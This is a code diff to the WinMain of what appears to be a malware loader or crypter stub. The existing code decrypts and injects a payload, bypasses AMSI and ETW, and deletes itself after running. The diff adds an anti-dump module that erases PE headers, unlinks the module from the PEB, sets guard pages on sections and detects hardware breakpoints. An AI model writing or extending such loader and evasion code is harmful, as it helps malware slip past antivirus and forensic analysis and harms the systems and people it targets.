@@ -38,6 +38,7 @@
 #include "DarknetDecrypt.h"
 #include "VoidDecrypt.h"
 #include "AntiMemScan.h"
+#include "AntiDump.h"
 #include "ThreadNormalizer.h"
 #include "Injection.h"
 #include "DotNetLoader.h"
@@ -241,7 +242,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 2a: Unified VEH Dispatcher ──
-    if (GlobalConfig.bPatchlessAmsiEtw || GlobalConfig.bGuardPage) {
+    if (GlobalConfig.bPatchlessAmsiEtw || GlobalConfig.bGuardPage || GlobalConfig.bAntiDump) {
         VehDispatcher::Init();
     }
 
@@ -367,6 +368,23 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         GuardPage::Install(PayloadData.data, decryptSize, finalKey, sizeof(finalKey));
     }
 
+    // ── Step 8c: Anti-Dump Protection (L23) ──
+    // Multi-layer защита от дампа процесса:
+    //   Layer 1: PE Header Erasure (DOS + NT headers → zero)
+    //   Layer 2: PEB Module Unlinking (invisible to EnumProcessModules)
+    //   Layer 3: Section Guard Pages (PAGE_GUARD on .xthrx/.reloc)
+    //   Layer 4: Breakpoint Detection (DR0-DR3 via indirect syscall)
+    //
+    //   RunPE mode: stub process exits after injection → skip header erasure
+    //   (erasing headers before the process is stable crashes the OS
+    //   exception dispatcher, and is pointless since the process dies)
+    //   Long-lived modes (Fibers/CallbackProxy/ModuleStomp): erase headers
+    //   after payload execution stabilizes via EraseHeadersNow()
+    if (GlobalConfig.bAntiDump) {
+        bool isShortLived = GlobalConfig.bRunPE;
+        AntiDump::Enable(nullptr, isShortLived);
+    }
+
     // ── Step 9: Execute Payload ──
     if (GlobalConfig.bDotNetLoading && DotNetLoader::IsDotNetAssembly(PayloadData.data, decryptSize)) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
@@ -422,11 +440,22 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         GodMode::ExecutePayload(PayloadData.data, decryptSize, false, false);
     }
 
+    // ── Step 9b: Erase PE headers for long-lived processes ──
+    // RunPE skips this (Enable was called with skipHeaderErase=true).
+    // For Fibers/CallbackProxy/ModuleStomp/etc., the process stays
+    // alive — erase headers now that payload execution is stable.
+    if (GlobalConfig.bAntiDump && !GlobalConfig.bRunPE) {
+        AntiDump::EraseHeadersNow();
+    }
+
     // ── Step 10: Self-Destruct (no admin needed) ──
     if (GlobalConfig.bMelt)
         Melt::SelfDestruct();
 
-    // ── Cleanup: отключаем PatchlessBypass и VehDispatcher ──
+    // ── Cleanup: отключаем Anti-Dump, PatchlessBypass и VehDispatcher ──
+    if (GlobalConfig.bAntiDump)
+        AntiDump::Disable();
+
     if (GlobalConfig.bPatchlessAmsiEtw)
         PatchlessBypass::Disable();
 
